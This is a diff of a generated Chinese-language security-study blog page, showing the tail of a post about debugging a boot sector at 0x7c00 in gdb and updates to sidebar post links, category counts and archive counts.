-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">remote Thread 1 In:                                                                L??   PC: 0x7c00 </span><br><span class="line">0x0000fff0 in ?? ()</span><br><span class="line">Breakpoint 1 at 0x7c00</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00007c00 in ?? ()</span><br><span class="line">(gdb) x/i $eip</span><br><span class="line">=&gt; 0x7c00:      cli</span><br><span class="line">(gdb) </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<p>可以看到断点和调试正常；</p>
-
-        
-        
-          <blockquote id="copyright">
-              <p>原文链接: <a href="https://www.jk404.cn/page/7/index.html">https://www.jk404.cn/page/7/index.html</a></p>
-              <p>版权声明: 转载请注明出处.</p>
-          </blockquote>
-        
-      
-    </div>
-    <footer class="article-footer">
-      
-        <div class="article-tag-wrap">
-          
-
-          
-          
-
-
-        </div>
-      
-      
-      
-    </footer>
-  </div>
-</article>
-
-
 
     <nav id="page-nav">
 
@@ -1510,6 +1630,14 @@
       <ul>
         
           <li>
+            <a href="/study/book/%E6%8F%AD%E7%A7%98%E5%AE%B6%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A80day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/router-vuln-D-link-Dir815/">router_vuln_D-link-Dir815</a>
+          </li>
+        
+          <li>
+            <a href="/study/book/%E6%8F%AD%E7%A7%98%E5%AE%B6%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A80day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/router-vuln-analysis/">router_vuln_analysis</a>
+          </li>
+        
+          <li>
             <a href="/study/book/%E6%8F%AD%E7%A7%98%E5%AE%B6%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A80day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/router-vuln-file-system/">router_vuln_file_system</a>
           </li>
         
@@ -1519,14 +1647,6 @@
         
           <li>
             <a href="/course/static-program-analysis/static-program-analysis-03-data-flow-analysis-1/">static_program_analysis_03-data_flow_analysis_1</a>
-          </li>
-        
-          <li>
-            <a href="/study/daily/talk/">talk</a>
-          </li>
-        
-          <li>
-            <a href="/course/static-program-analysis/static-program-analysis-02-intermediate-representation/">static_program_analysis_02_intermediate-representation</a>
           </li>
         
       </ul>
@@ -1541,7 +1661,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title"><i class="fa fa-classify"></i> 分类</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/">CSAPP-lab</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/bomblab/">bomblab</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/datalab/">datalab</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/preparelab/">preparelab</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">30</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/">PWN</a><span class="category-list-count">30</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/">kernel pwn</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/FUZZ/">FUZZ</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/FUZZ/Syzkaller/">Syzkaller</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/FUZZ/Trinity/">Trinity</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/Linux-source/">Linux source</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/cve/">cve</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/knowledge/">knowledge</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/wp/">wp</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/uncategorized/">uncategorized</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/user-space-pwn/">user space pwn</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/user-space-pwn/cve/">cve</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/">wp</a><span class="category-list-count">12</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/asisctf/">asisctf</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/asisctf/asisctf2021/">asisctf2021</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/buuoj/">buuoj</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/l3hctf/">l3hctf</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/pwnable-kr/">pwnable.kr</a><span class="category-list-count">7</span></li></ul></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/">OS</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/">lab1</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge1-what-is-make/">challenge1:what is make</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge2-qemu-gdb/">challenge2:qemu&gdb</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge3-go-into-protected-mode/">challenge3:go into protected mode</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge4-load-kernel-elf/">challenge4:load kernel elf</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge5-trace-stackframe/">challenge5:trace stackframe</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge6-interrupt-handle/">challenge6:interrupt handle</a><span class="category-list-count">3</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/Fuzz/">Fuzz</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/Fuzz/AFL/">AFL</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/cve/">cve</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/microcorruption/">microcorruption</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/course/">course</a><span class="category-list-count">4</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/course/MIT-AI/">MIT-AI</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/course/static-program-analysis/">static_program_analysis</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/golang/">golang</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/golang/start/">start</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn-college/">pwn.college</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/pwn-college/Chapter01-Program-interaction/">Chapter01 Program interaction</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn-college/Chapter02-Binary-file/">Chapter02 Binary file</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn-college/Introduciton/">Introduciton</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/">study</a><span class="category-list-count">19</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/study/book/">book</a><span class="category-list-count">15</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/study/book/%E6%8F%AD%E7%A7%98%E5%AE%B6%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A80day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/">揭秘家用路由器0day漏洞挖掘技术</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/">程序员的自我修养：链接、装载与库</a><span class="category-list-count">7</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/daily/">daily</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/welcome/">welcome</a><span class="category-list-count">1</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/">CSAPP-lab</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/bomblab/">bomblab</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/datalab/">datalab</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/preparelab/">preparelab</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">30</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/">PWN</a><span class="category-list-count">30</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/">kernel pwn</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/FUZZ/">FUZZ</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/FUZZ/Syzkaller/">Syzkaller</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/FUZZ/Trinity/">Trinity</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/Linux-source/">Linux source</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/cve/">cve</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/knowledge/">knowledge</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/wp/">wp</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/uncategorized/">uncategorized</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/user-space-pwn/">user space pwn</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/user-space-pwn/cve/">cve</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/">wp</a><span class="category-list-count">12</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/asisctf/">asisctf</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/asisctf/asisctf2021/">asisctf2021</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/buuoj/">buuoj</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/l3hctf/">l3hctf</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/pwnable-kr/">pwnable.kr</a><span class="category-list-count">7</span></li></ul></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/">OS</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/">lab1</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge1-what-is-make/">challenge1:what is make</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge2-qemu-gdb/">challenge2:qemu&gdb</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge3-go-into-protected-mode/">challenge3:go into protected mode</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge4-load-kernel-elf/">challenge4:load kernel elf</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge5-trace-stackframe/">challenge5:trace stackframe</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge6-interrupt-handle/">challenge6:interrupt handle</a><span class="category-list-count">3</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/Fuzz/">Fuzz</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/Fuzz/AFL/">AFL</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/cve/">cve</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/microcorruption/">microcorruption</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/course/">course</a><span class="category-list-count">4</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/course/MIT-AI/">MIT-AI</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/course/static-program-analysis/">static_program_analysis</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/golang/">golang</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/golang/start/">start</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn-college/">pwn.college</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/pwn-college/Chapter01-Program-interaction/">Chapter01 Program interaction</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn-college/Chapter02-Binary-file/">Chapter02 Binary file</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn-college/Introduciton/">Introduciton</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/">study</a><span class="category-list-count">21</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/study/book/">book</a><span class="category-list-count">17</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/study/book/%E6%8F%AD%E7%A7%98%E5%AE%B6%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A80day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/">揭秘家用路由器0day漏洞挖掘技术</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/">程序员的自我修养：链接、装载与库</a><span class="category-list-count">7</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/daily/">daily</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/welcome/">welcome</a><span class="category-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -1551,7 +1671,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title"><i class="fa fa-archive"></i> 归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022年03月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021年12月</a><span class="archive-list-count">76</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022年03月</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021年12月</a><span class="archive-list-count">76</span></li></ul>
     </div>
   </div>
 
